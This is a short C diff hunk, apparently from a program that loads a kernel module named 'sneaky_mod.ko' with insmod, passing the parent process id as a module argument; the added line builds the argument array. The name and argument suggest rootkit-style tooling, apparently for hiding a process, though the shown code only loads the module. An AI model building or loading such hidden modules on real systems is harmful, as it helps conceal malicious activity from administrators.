@@ -63,6 +63,7 @@ void load_module(){
 
     char module_arg[50];
     snprintf(module_arg, sizeof(module_arg),"parent_id = %d\n", parent_process);
+    char * argv[4] = {"insmod", "sneaky_mod.ko", module_arg, NULL};
     
     if(execvp("insmod", argv) < 0){
       perror( "execution error the module loading process");
